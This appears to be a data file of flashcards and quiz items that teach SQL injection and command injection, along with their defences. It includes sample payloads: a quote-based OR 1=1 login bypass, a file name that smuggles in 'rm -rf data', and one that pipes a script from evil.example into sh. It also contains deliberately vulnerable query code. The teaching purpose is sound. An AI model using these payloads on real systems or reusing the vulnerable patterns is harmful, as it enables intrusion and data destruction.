unit.title: Injection: SQL and commands
unit.description: SQL injection, parameterized queries, ORMs, untrusted input, command injection, database rights

cards.definition: A flaw where user input is mixed into code (SQL, a shell command) and gets executed as code instead of being treated as data.
cards.example: A search box whose text ends up inside a database query.

cards.definition: Injection into a database query: the attacker writes SQL in a field to read, change or delete data.
cards.example: Typing a quote and OR 1=1 in a login field to bypass the password check.

cards.definition: A query where values are sent separately from the SQL text, through placeholders, so they can never be run as SQL.
Any data coming from outside your code: forms, URL parameters, headers, cookies, uploaded files, third-party APIs.
cards.example: Even a hidden form field can be changed by the user.

cards.definition: A library that turns database rows into objects and builds parameterized queries for you, such as SQLAlchemy or Prisma.
cards.example: User.objects.filter(email=email) never glues text into SQL.

cards.definition: Injection into a shell command: input such as a file name carries extra commands that the server runs.
cards.example: A file named photo.png; rm -rf data passed to os.system.

exercises.prompt: What is wrong with this code?
choices: User input is glued into the SQL text: SQL injection
A semicolon is missing at the end
SELECT * is a bit slow
Emails cannot be stored in SQL
exercises.explain: Whatever the user types becomes part of the query. A quote in the input lets them rewrite the condition.

code.src:
email = request.form["email"]
query = "SELECT * FROM users WHERE email = '" + email + "'"
db.execute(query)

exercises.prompt: In that code, an attacker types  ' OR '1'='1  in the email field. What happens?
choices: The condition is always true: every user returns
The page only shows an error message
Nothing happens, the input is ignored
The current user is logged out
exercises.explain: The query becomes WHERE email = '' OR '1'='1', which is true for every row.

exercises.prompt: What is the main fix for SQL injection?
choices: Parameterized queries: values are sent apart from the SQL
Removing quotes from the input by hand
Limiting the length of the input
Hiding the error messages
exercises.explain: With placeholders, the database knows which part is code and which part is data. Escaping by hand always misses a case.

exercises.prompt: Build a safe query that reads the user whose id is user_id.
exercises.explain: The SQL text holds a placeholder (?) and the value travels separately, in a tuple. No + between SQL and input.

exercises.prompt: Using an ORM properly, without raw SQL built from input, protects against most SQL injection.
exercises.explain: True: ORMs build parameterized queries. The danger comes back the moment you write raw SQL with concatenated input.

exercises.prompt: Hiding SQL error messages from users fixes SQL injection.
exercises.explain: False: it hides useful clues, which is good, but the query is still injectable. Attackers have blind techniques that need no error message.

exercises.prompt: A server runs os.system("convert " + filename + " out.png") with a file name sent by the user. Which attack does this allow?
choices: Command injection
SQL injection
XSS
CSRF
exercises.explain: A name like x.png; curl evil.example | sh adds a second command. Use a list of arguments (subprocess.run with a list) and validate the name.

exercises.prompt: Which data should your server treat as untrusted?
choices: All of it: forms, URL, headers, cookies, files
Only the text typed in the forms
Only what anonymous visitors send
Nothing that logged-in users send
exercises.explain: Logged-in users can be attackers too, and any part of a request can be forged. Validate and parameterize everywhere.

exercises.prompt: Which line makes this Node.js route vulnerable to SQL injection?
lines: const sql = "SELECT * FROM products WHERE id = " + id;
exercises.explain: The id from the URL is glued into the SQL text. Use db.query("SELECT * FROM products WHERE id = $1", [id]).

exercises.prompt: Which database account should your web app use?
choices: One limited to the tables and actions it needs
The superuser account, for simplicity
A shared admin account for the whole team
The root account, with its password in the code
exercises.explain: If an injection slips through, a limited account cannot drop tables or read everything. Least privilege again.
